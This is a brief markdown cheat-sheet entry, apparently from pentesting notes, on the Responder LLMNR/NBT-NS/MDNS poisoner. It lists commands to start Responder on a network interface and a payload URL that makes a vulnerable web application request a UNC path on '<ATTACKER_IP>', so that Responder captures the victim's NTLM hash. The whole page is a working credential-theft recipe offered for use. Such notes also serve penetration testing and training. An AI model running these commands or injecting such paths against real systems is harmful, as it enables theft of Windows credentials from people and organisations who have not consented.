---
title: Responder
desc:  It contains Responder/MultiRelay, an LLMNR, NBT-NS and MDNS poisoner. It will answer to specific NBT-NS (NetBIOS Name Server) queries. It also used to get NTLM hash of administrator user.
tags: [SMB, Windows]
alts: []
website:
render_with_liquid: false
---

## Basic

```sh
# Specity the network interface
responder -I eth0
responder -I tun0
```

<br />

## Get NTLM hash

```sh
# Listen
responder -I tun0

# --- Listening ----------------------------------

# Access the target
https://vulnerable.com/index.php?value=//<ATTACKER_IP>/somedir
```